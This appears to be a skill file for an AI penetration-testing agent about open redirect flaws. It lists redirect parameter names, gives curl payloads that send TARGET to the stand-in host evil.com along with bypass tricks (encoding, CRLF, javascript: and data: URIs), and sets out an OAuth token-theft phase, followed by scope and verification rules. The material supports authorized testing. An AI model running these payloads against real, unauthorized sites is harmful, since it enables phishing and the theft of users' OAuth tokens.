---
name: attack-open-redirect
description: "Open redirect exploitation — URL parameter manipulation, OAuth token theft, phishing chains"
category: "web-application"
version: "1.1.0"
author: "cyberstrike-official"
tags:
  - open-redirect
  - web
  - phishing
  - oauth
  - attack
tech_stack:
  - web
cwe_ids:
  - CWE-601
chains_with:
  - attack-cors
  - attack-jwt
  - attack-host-header
  - attack-cache-poison
prerequisites: []
severity_boost:
  attack-jwt: "An open redirect may weaken an OAuth flow only when the redirect_uri validation or token/code delivery impact is demonstrated with a test client."
  attack-host-header: "Host-derived redirect destinations can chain with host-header trust flaws when the destination is attacker-controlled and reproducible."
  attack-cache-poison: "A redirect becomes a cache-poisoning chain only when a clean request receives the cached redirect without the injected input."
---

# Open Redirect

## Objective

Exploit URL redirect parameters to redirect users to attacker-controlled domains, steal OAuth tokens, or bypass security controls.

## Testing Methodology

### Phase 1: Identify Redirect Parameters

Common parameter names:
```
url, redirect, redirect_url, redirect_uri, return, return_url, returnTo,
next, goto, target, dest, destination, rurl, redir, forward, continue,
callback, path, out, view, login_url, image_url, go, link, ref
```

### Phase 2: Basic Payloads

```bash
# Direct redirect
curl --max-time 15 --connect-timeout 5 -s -D- "https://TARGET/redirect?url=https://evil.com"

# Protocol-relative
curl --max-time 15 --connect-timeout 5 -s -D- "https://TARGET/redirect?url=//evil.com"

# Encoded
curl --max-time 15 --connect-timeout 5 -s -D- "https://TARGET/redirect?url=https%3A%2F%2Fevil.com"

# Backslash bypass
curl --max-time 15 --connect-timeout 5 -s -D- "https://TARGET/redirect?url=https://evil.com\@TARGET"

# At-sign bypass
curl --max-time 15 --connect-timeout 5 -s -D- "https://TARGET/redirect?url=https://TARGET@evil.com"
```

### Phase 3: Filter Bypass

```bash
# Subdomain matching
curl --max-time 15 --connect-timeout 5 -s -D- "https://TARGET/redirect?url=https://TARGET.evil.com"

# URL encoding tricks
curl --max-time 15 --connect-timeout 5 -s -D- "https://TARGET/redirect?url=https://evil.com%23.TARGET"

# Double encoding
curl --max-time 15 --connect-timeout 5 -s -D- "https://TARGET/redirect?url=https://%65%76%69%6c.com"

# Null byte
curl --max-time 15 --connect-timeout 5 -s -D- "https://TARGET/redirect?url=https://evil.com%00.TARGET"

# CRLF + Location header
curl --max-time 15 --connect-timeout 5 -s -D- "https://TARGET/redirect?url=%0d%0aLocation:%20https://evil.com"

# JavaScript scheme
curl --max-time 15 --connect-timeout 5 -s -D- "https://TARGET/redirect?url=javascript:alert(document.domain)"

# Data URI
curl --max-time 15 --connect-timeout 5 -s -D- "https://TARGET/redirect?url=data:text/html,<script>alert(1)</script>"
```

### Phase 4: OAuth Token Theft

```bash
# Test with OAuth tester
attack_script oauth_tester "https://TARGET/oauth/authorize" \
  --client-id CLIENT_ID \
  --redirect-uri "https://TARGET/callback" \
  --json-output
```

If redirect_uri accepts attacker domain, the OAuth code/token is sent to the attacker.

### Phase 5: Impact Escalation

- Redirect in login flow → credential phishing
- Redirect in OAuth flow → token theft (P1)
- Redirect in email verification → account takeover
- Redirect + SSRF → internal access

## What Constitutes a Finding

| Finding | Severity |
|---------|----------|
| Open redirect + OAuth token theft | Critical (P1) |
| Open redirect in login/auth flow | High (P2) |
| Generic open redirect | Medium (P3) |
| JavaScript scheme redirect (XSS) | High (P2) |

## Evidence Requirements

- URL with redirect parameter and payload
- Response showing 302/301 to attacker domain
- For OAuth: stolen authorization code/token
- Location header value in response

## Tools

- `attack_script oauth_tester` — OAuth redirect_uri bypass testing
- `curl` — manual redirect testing

## OAuth and Redirect-Chain Validation

Prioritize redirect parameters used in login, logout, OAuth/OIDC callback, invite, and password-reset flows. Check common parameter variants (`next`, `return`, `returnTo`, `continue`, `redirect`, `redirect_uri`, `url`) and observe the actual `Location` header or browser navigation.

- Test allowlist parsing with one harmless external destination you control. Verify normalization, URL parsing, scheme-relative URLs, encoded delimiters, and host suffix handling separately; do not assume a reflected parameter causes a redirect.
- For OAuth/OIDC, use a test client and test account. Confirm whether an authorization code or token is actually delivered to an untrusted destination before claiming token theft or account takeover. A redirect on the same trusted domain is not automatically a bypass.
- Separate phishing/open-redirect impact from server-side fetching. Only test SSRF escalation if the application fetches the destination itself and that behavior is within scope.
- Record the original URL, exact parameter, response `Location`, final destination, and whether any sensitive value was actually exposed. Redact codes, tokens, and session values.

## Verification and False Positives

- Confirm that the application redirects to an attacker-controlled destination after parsing the supplied input. A URL parameter that is ignored or safely normalized is not a finding.
- Use a domain you control for testing and do not collect OAuth codes, access tokens, or other users' data. For OAuth-related chains, prove the token/authorization impact using a test account and a safe callback.
- Check relative URLs, scheme-relative URLs, encoded delimiters, and allowlist parsing one at a time. A redirect to an allowlisted domain or a URL displayed in text is not an open redirect.
- Severity depends on the trust boundary and demonstrated chain. A standalone redirect is not automatically account takeover or token theft.
- Preserve the original URL, the exact redirect parameter, the `Location` response, and the final destination. Redact sensitive query values.
- [uphiago/recon-skills — open-redirect hunting](https://github.com/uphiago/recon-skills/blob/main/redteam/hunt-open-redirect/SKILL.md) (external research reference).
- [elementalsouls/Claude-BugHunter — open-redirect hunting](https://github.com/elementalsouls/Claude-BugHunter/blob/main/skills/hunt-open-redirect/SKILL.md) (external research reference; not a local Cyber Strike skill path).

## Redirect Validation Matrix and Abuse Boundaries

Test redirect handling with a controlled destination and a harmless path. Change one representation at a time and compare the parsed destination with the application's intended allowlist.

| Input class | Compare | Record |
|---|---|---|
| Absolute URL | trusted host vs controlled external host | final Location and normalized destination |
| Relative path | root-relative, path-relative, protocol-relative | browser-resolved destination |
| Encoding | percent encoding, double encoding, mixed case | normalization order and final destination |
| Host parsing | userinfo, trailing dot, subdomain suffix, alternate port | actual hostname parsed by the server/browser |
| Redirect chain | one hop vs multiple hops | every Location and whether trust is revalidated |
| OAuth flow | registered redirect URI and state handling | test-client behavior without exposing tokens |

Use only test clients and accounts. Do not send real authorization codes or tokens to an external endpoint. A URL that looks suspicious is not sufficient; prove that the browser reaches an untrusted destination and describe the security consequence. For OAuth chains, verify the registered redirect URI and token/code delivery separately rather than assuming any open redirect causes token theft.

Include the original URL, sanitized redirect chain, final destination, normalization behavior, test account context, and minimal reproducible evidence.

## Related Skills and Chains

- [`attack-cache-poison`](../attack-cache-poison/SKILL.md) — link only when a redirect response is stored in a shared cache and a clean request receives it without the injected input.
- [`attack-host-header`](../attack-host-header/SKILL.md) — assess whether Host/forwarded-host trust controls the generated redirect destination.
- [`attack-cors`](../attack-cors/SKILL.md) — validate CORS separately when redirect flows cross origins; do not infer CORS impact from a redirect alone.
- [`attack-jwt`](../attack-jwt/SKILL.md) — assess token exposure only when the OAuth/redirect flow and test evidence establish it.


## Adaptive Verification Contract (maximum 20 distinct hypotheses)

The 20-attempt budget is a ceiling for independent, evidence-producing hypotheses, not a quota for payload mutations. If a signal remains plausible, follow relevant branches up to the ceiling; stop early when impact is decisive, no relevant branch remains, or safety/scope limits apply. Cosmetic input changes with the same semantics are not separate attempts.

Record each attempt: hypothesis, single changed variable, control/baseline, observed signal, interpretation, confidence and next branch. Prefer paired requests, controlled identities, synthetic records and independent corroboration; retain minimal sanitized evidence.

### Skill-specific hypothesis order

Choose independent, low-impact verification branches already supported by this skill's coverage matrix.

### Verdict gates

- **Confirmed:** repeatable security impact against an explicitly in-scope resource is shown using a tester-controlled identity/fixture and a meaningful negative control.
- **Likely / needs corroboration:** independent observations support the hypothesis but impact/root cause remains uncertain.
- **Unconfirmed:** output is generic, cached, ambiguous, or detached from a security boundary.
- **Refuted / false positive:** a relevant negative control or valid product/security-policy explanation accounts for the signal. Document attempted branches rather than claiming to exhaust every theoretical variant.
- Status codes, banners, timing changes, error messages, or scanner alerts alone are not proof.

### Stop, cleanup, and handoff

Stop at scope ambiguity, real-user data, unexpected state changes, service degradation, secret exposure or a prohibited action. Clean disposable state, revoke temporary sessions/tokens where possible, and log cleanup status. Handoff scope proof, baseline, hypothesis, attempts used, impact, controls, verdict/confidence, sanitized evidence and any proven related-skill trigger; do not chain from a speculative association.

## References

- [PortSwigger: Open Redirect](https://portswigger.net/kb/issues/00500100_open-redirection-reflected)
- [OWASP: Unvalidated Redirects](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
